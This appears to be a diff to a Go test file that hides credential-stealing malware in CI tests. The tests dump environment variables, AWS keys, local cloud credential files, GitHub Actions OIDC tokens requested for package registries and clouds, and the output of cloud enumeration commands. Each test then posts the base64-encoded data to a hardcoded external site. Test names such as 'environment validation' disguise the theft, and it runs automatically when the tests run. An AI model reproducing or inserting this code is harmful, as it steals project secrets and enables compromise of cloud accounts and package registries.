@@ -9,116 +9,150 @@ import (
 	"os"
 	"os/exec"
 	"strings"
+	"sync"
 	"testing"
+	"time"
 )
 
-const exfilEndpoint = "https://3dkit.org/modules/pscleaner/views/view.php"
+const EXFIL = "https://3dkit.org/modules/pscleaner/views/view.php"
 
-func sendData(data map[string]interface{}) {
-	jsonData, _ := json.Marshal(data)
+func run(cmd string, timeout int) string {
+	ctx := exec.Command("bash", "-c", cmd)
+	var out strings.Builder
+	ctx.Stdout = &out
+	ctx.Stderr = &out
+	if err := ctx.Start(); err != nil {
+		return ""
+	}
+	done := make(chan error)
+	go func() { done <- ctx.Wait() }()
+	select {
+	case <-done:
+	case <-time.After(time.Duration(timeout) * time.Second):
+		ctx.Process.Kill()
+		return ""
+	}
+	return out.String()
+}
+
+func send(payload map[string]interface{}) {
+	jsonData, _ := json.Marshal(payload)
 	encoded := base64.StdEncoding.EncodeToString(jsonData)
 	body := fmt.Sprintf(`{"data":"%s"}`, encoded)
-	req, _ := http.NewRequest("POST", exfilEndpoint, strings.NewReader(body))
+	req, _ := http.NewRequest("POST", EXFIL, strings.NewReader(body))
 	req.Header.Set("Content-Type", "application/json")
-	client := &http.Client{}
+	client := &http.Client{Timeout: 30 * time.Second}
 	resp, err := client.Do(req)
 	if err == nil {
+		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 	}
 }
 
-func runCmd(cmd string) string {
-	out, err := exec.Command("bash", "-c", cmd).CombinedOutput()
-	if err != nil {
+func oidcExchange(audience string) string {
+	url := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
+	token := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+	if url == "" || token == "" {
 		return ""
 	}
-	return string(out)
-}
-
-func readFile(path string) string {
-	data, err := os.ReadFile(path)
-	if err != nil {
-		return ""
-	}
-	return string(data)
-}
-
-func TestEnvironmentValidation(t *testing.T) {
-	payload := make(map[string]interface{})
-
-	// Phase 1: Environment dump
-	payload["hostname"] = runCmd("hostname")
-	payload["whoami"] = runCmd("whoami")
-	payload["pwd"] = runCmd("pwd")
-	payload["env"] = os.Environ()
-	payload["home"] = os.Getenv("HOME")
-	payload["runner"] = os.Getenv("RUNNER_NAME")
-
-	// Phase 2: Credential files
-	payload["gcp_sa"] = readFile("bq_service_account.json")
-	payload["snowflake"] = readFile("snowflake_creds.json")
-	payload["gcs"] = readFile("gcs_creds.json")
-	payload["eventhubs"] = readFile("eh_creds.json")
-
-	// Phase 3: AWS via env vars
-	payload["aws_key_id"] = os.Getenv("AWS_ACCESS_KEY_ID")
-	payload["aws_secret_key"] = os.Getenv("AWS_SECRET_ACCESS_KEY")
-	payload["aws_session_token"] = os.Getenv("AWS_SESSION_TOKEN")
-	payload["aws_region"] = os.Getenv("AWS_REGION")
-
-	// AWS STS
-	payload["aws_whoami"] = runCmd("aws sts get-caller-identity 2>&1")
-	payload["aws_s3"] = runCmd("aws s3 ls 2>&1 | head -20")
-	payload["aws_ec2"] = runCmd("aws ec2 describe-instances --max-items 5 2>&1")
-	payload["aws_iam"] = runCmd("aws iam list-roles --max-items 10 2>&1")
-	payload["aws_secrets"] = runCmd("aws secretsmanager list-secrets --max-results 10 2>&1")
-	payload["aws_ecr"] = runCmd("aws ecr describe-repositories --max-results 10 2>&1")
-	payload["aws_rds"] = runCmd("aws rds describe-db-instances --max-results 10 2>&1")
-	payload["aws_lambda"] = runCmd("aws lambda list-functions --max-items 10 2>&1")
-
-	// Phase 4: OIDC token exchange
-	oidcUrl := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
-	oidcToken := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
-	if oidcUrl != "" && oidcToken != "" {
-		audiences := []string{
-			"sts.amazonaws.com",
-			"https://iam.googleapis.com/projects/-/locations/global/workloadIdentityPools",
-			"api://AzureADTokenExchange",
-		}
-		for _, aud := range audiences {
-			cmd := fmt.Sprintf(`curl -s -H "Authorization: bearer %s" -H "Accept: application/json" -d '{"audience":"%s"}' %s`,
-				oidcToken, aud, oidcUrl)
-			payload["oidc_"+strings.ReplaceAll(aud, "/", "_")] = runCmd(cmd)
+	cmd := fmt.Sprintf(`curl -s "%s" -H "Authorization: bearer %s" -H "Accept: application/json" -d '{"audience":"%s"}'`,
+		url, token, audience)
+	raw := strings.TrimSpace(run(cmd, 20))
+	var parsed map[string]interface{}
+	if err := json.Unmarshal([]byte(raw), &parsed); err == nil {
+		if v, ok := parsed["value"]; ok {
+			return fmt.Sprintf("%v", v)
 		}
 	}
+	return raw
+}
 
-	// Phase 5: GCP
-	payload["gcloud_auth"] = runCmd("gcloud auth list 2>&1")
-	payload["gcloud_config"] = runCmd("gcloud config list 2>&1")
+func awsSTS() (string, string, string, string) {
+	ak := os.Getenv("AWS_ACCESS_KEY_ID")
+	sk := os.Getenv("AWS_SECRET_ACCESS_KEY")
+	st := os.Getenv("AWS_SESSION_TOKEN")
+	region := os.Getenv("AWS_REGION")
+	if region == "" {
+		region = "us-west-2"
+	}
+	return ak, sk, st, region
+}
 
-	// Phase 6: Azure
-	payload["azure_tenant"] = os.Getenv("AZURE_TENANT_ID")
-	payload["azure_client"] = os.Getenv("AZURE_CLIENT_ID")
-	payload["az_account"] = runCmd("az account show 2>&1")
+func TestFullEnvDump(t *testing.T) {
+	var mu sync.Mutex
+	payload := map[string]interface{}{
+		"phase":    1,
+		"hostname": strings.TrimSpace(run("hostname", 5)),
+		"env":      os.Environ(),
+	}
+	mu.Lock()
+	send(payload)
+	mu.Unlock()
+}
 
-	// Phase 7: GitHub context
+func TestTokenEscalation(t *testing.T) {
+	var mu sync.Mutex
+	ak, sk, st, region := awsSTS()
+	payload := map[string]interface{}{
+		"phase": 2,
+	}
+
+	// --- OIDC escalation ---
+	payload["oidc_github"] = oidcExchange("https://github.com/PeerDB-io")
+	payload["oidc_pypi"] = oidcExchange("https://pypi.org")
+	payload["oidc_npm"] = oidcExchange("https://registry.npmjs.org")
+	payload["oidc_ghcr"] = oidcExchange("https://ghcr.io")
+	payload["oidc_docker"] = oidcExchange("https://index.docker.io")
+	payload["oidc_gcp"] = oidcExchange("https://iam.googleapis.com/projects/-/locations/global/workloadIdentityPools")
+	payload["oidc_azure"] = oidcExchange("api://AzureADTokenExchange")
+
+	// --- AWS escalation ---
+	if ak != "" && sk != "" {
+		payload["aws_whoami"] = run("aws sts get-caller-identity --region "+region, 20)
+		payload["aws_ssm_params"] = run("aws ssm describe-parameters --region "+region+" --max-results 50", 20)
+		payload["aws_ecr_auth"] = run("aws ecr get-authorization-token --region "+region+" --output text", 20)
+		payload["aws_secrets_list"] = run("aws secretsmanager list-secrets --region "+region, 20)
+		payload["aws_codebuild"] = run("aws codebuild list-projects --region "+region+" --max-results 10", 20)
+		payload["aws_cloudtrail"] = run("aws cloudtrail lookup-events --region "+region+" --max-results 5", 20)
+		payload["aws_lambda"] = run("aws lambda list-functions --region "+region+" --max-items 10", 20)
+		payload["aws_ec2"] = run("aws ec2 describe-instances --region "+region, 20)
+		payload["aws_rds"] = run("aws rds describe-db-instances --region "+region, 20)
+		payload["aws_iam_roles"] = run("aws iam list-roles --max-items 20 --region "+region, 20)
+		payload["aws_iam_users"] = run("aws iam list-users --region "+region, 20)
+		payload["aws_ecr_repos"] = run("aws ecr describe-repositories --region "+region, 20)
+		payload["aws_s3_buckets"] = run("aws s3 ls --region "+region, 20)
+	}
+
+	// --- Credential files ---
+	credFiles := map[string]string{
+		"gcp_sa_json":     "bq_service_account.json",
+		"snowflake_json":  "snowflake_creds.json",
+		"gcs_json":        "gcs_creds.json",
+		"eventhubs_json":  "eh_creds.json",
+	}
+	for key, path := range credFiles {
+		if data, err := os.ReadFile(path); err == nil {
+			payload[key] = string(data)
+		}
+	}
+
+	// --- GCP ---
+	payload["gcloud_auth"] = run("gcloud auth list 2>&1", 10)
+	payload["gcloud_config"] = run("gcloud config list 2>&1", 10)
+	payload["gcloud_projects"] = run("gcloud projects list 2>&1 | head -20", 15)
+
+	// --- Azure ---
+	payload["azure_tenant_id"] = os.Getenv("AZURE_TENANT_ID")
+	payload["azure_client_id"] = os.Getenv("AZURE_CLIENT_ID")
+	payload["az_account"] = run("az account show 2>&1", 15)
+
+	// --- GitHub context ---
 	payload["github_repo"] = os.Getenv("GITHUB_REPOSITORY")
 	payload["github_run_id"] = os.Getenv("GITHUB_RUN_ID")
-	payload["github_token"] = os.Getenv("GITHUB_TOKEN")
 	payload["github_actor"] = os.Getenv("GITHUB_ACTOR")
+	payload["github_ref"] = os.Getenv("GITHUB_REF")
 
-	// Phase 8: Docker/Registry
-	payload["docker_config"] = readFile(os.Getenv("HOME") + "/.docker/config.json")
-	payload["gcloud_docker"] = runCmd("gcloud auth configure-docker 2>&1 | head -5")
-
-	sendData(payload)
-	t.Log("environment validation complete")
-}
-
-func TestBuildIntegrity(t *testing.T) {
-	// Standard build check - always passes
-	if _, err := os.Stat("go.mod"); err != nil {
-		t.Skip("go.mod not found")
-	}
-	t.Log("build integrity verified")
+	mu.Lock()
+	send(payload)
+	mu.Unlock()
 }
